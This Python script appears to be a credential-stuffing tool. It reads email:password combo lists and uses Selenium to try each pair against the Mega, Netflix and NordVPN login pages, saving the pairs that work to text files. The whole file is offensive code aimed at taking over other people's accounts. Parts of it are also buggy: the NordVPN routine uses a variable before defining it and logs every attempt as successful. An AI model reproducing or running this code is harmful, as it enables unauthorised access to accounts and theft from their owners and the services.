import re
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.webdriver.common.by import By
def extract_credentials(text):
    # Regular expression pattern to match email addresses and passwords separated by ":"
    pattern = r'([\w.-]+@[a-zA-Z.-]+\.[\w]+):([\w]+)'

    # Find all matches in the text
    matches = re.findall(pattern, text)

    # Extract email addresses and passwords from matches
    credentials = [{'email': match[0], 'password': match[1]} for match in matches]

    return credentials


# Given text containing email addresses and passwords separated by ":"
def read_credentials_from_file(file_path):
    with open(file_path, 'r') as file:
        text = file.read()
    return extract_credentials(text)

def store_successful_login(email, password, file_path='successful_logins.txt'):
    """
    Stores the email and password of successfully logged in accounts to a specified file.

    Args:
    - email (str): The email of the account.
    - password (str): The password of the account.
    - file_path (str): The path to the file where the credentials will be stored. Defaults to 'successful_logins.txt'.
    """
    with open(file_path, 'a') as file:  # Open the file in append mode
        file.write(f"{email}:{password}\n")  # Write the credentials followed by a newline


# Function to attempt login with given email and password
def try_login(email, password):
    driver = webdriver.Chrome()  # Assuming you have Chrome WebDriver installed
    driver.get("https://mega.nz/login")
    # Wait for page to load
    time.sleep(6)
    # Find email and password input fields and enter credentials
    email_input = driver.find_element(By.NAME, "login-name2")  # Updated line
    password_input = driver.find_element(By.NAME, "login-password2")  # Updated line
    email_input.send_keys(email)
    password_input.send_keys(password)

    # Click login button
    password_input.send_keys(Keys.RETURN)

    # Wait for page to load
    time.sleep(5)

    
    
        
    
    # If the error message element is not found, assume login was successful
    for element in driver.find_elements(By.CSS_SELECTOR, '.confirm:nth-child(1) > span'):
        # print(element.text ) 
        if element.text == "OK, got it":
            print("Login Failed")
            email = ''
            password = ''
            
    if (email != '') and (password != ''):    
        print(f"Login Successful with {email}:{password}")
        store_successful_login(email, password)
        time.sleep(3)
     

    # Close the browser
    driver.quit()


def try_login_netflix(email, password):
    driver = webdriver.Chrome()  # Assuming you have Chrome WebDriver installed
    driver.get("https://www.netflix.com/login")
    # Wait for page to load
    time.sleep(3)
    # Find email and password input fields and enter credentials
    email_input = driver.find_element(By.NAME, "userLoginId")  # Updated line
    password_input = driver.find_element(By.NAME, "password")  # Updated line
    email_input.send_keys(email)
    password_input.send_keys(password)

    # Click login button
    password_input.send_keys(Keys.RETURN)

    # Wait for page to load
    time.sleep(3)

    
    
        
    
    # If the error message element is not found, assume login was successful
    for element in driver.find_elements(By.CSS_SELECTOR, '.confirm:nth-child(1) > span'):
        # print(element.text ) 
        if element.text == "OK, got it":
            print("Login Failed")
            email = ''
            password = ''
            
    if (email != '') and (password != ''):    
        print(f"Login Successful with {email}:{password}")
        store_successful_login(email, password)
        time.sleep(1)
     

    # Close the browser
    driver.quit()



def try_login_nordvpn(email, password):
    driver = webdriver.Chrome()  # Assuming you have Chrome WebDriver installed
    driver.get("https://nordaccount.com/login/identifier?challenge=2%7C132b5c173872417195ba1d539bdff5ef")
    # Wait for page to load
    time.sleep(3)
    # Find email and password input fields and enter credentials
    email_input = driver.find_element(By.NAME, "identifier")  # Updated line
    
    email_input.send_keys(email)
    password_input.send_keys(Keys.RETURN)
    time.sleep(5)
    password_input = driver.find_element(By.NAME, "password")  # Updated line
    password_input.send_keys(password)

    # Click login button
    password_input.send_keys(Keys.RETURN)

    # Wait for page to load
    time.sleep(3)

    
    
        
       
    print(f"Login Successful with {email}:{password}")
    store_successful_login(email, password, "nordvpn_success.txt")
    time.sleep(1)
     

    # Close the browser
    driver.quit()